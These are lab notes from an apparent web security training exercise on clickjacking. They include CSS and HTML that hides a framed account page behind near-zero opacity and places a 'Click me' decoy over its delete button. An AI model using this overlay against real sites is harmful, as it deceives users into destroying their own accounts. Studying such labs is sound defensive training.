Lab #1: Basic clickjacking with CSRF token protection

Target: delete an account

This lab contains login functionality and a delete account button that is protected by a CSRF token.
A user will click on elements that display the word "click" on a decoy website.

Hint: 
    To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. 
    The lab is solved when the account is deleted.
    You can log in to your own account using the following credentials: wiener:peter


Analysis:

  In the target site there is a delete button in my_account page to delete your account. 
  We can present this page in an iframe with a very low opacity and put a div with text "click me" in front of the delete button:
 the dimensions are calculated by try and error, but a systematic method is preferred. 
 z-index shows which layer is on top

  <style>
    iframe {
        position: relative; 
        height: 1000px; 
        width: 700px;
        opacity: 0.0000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
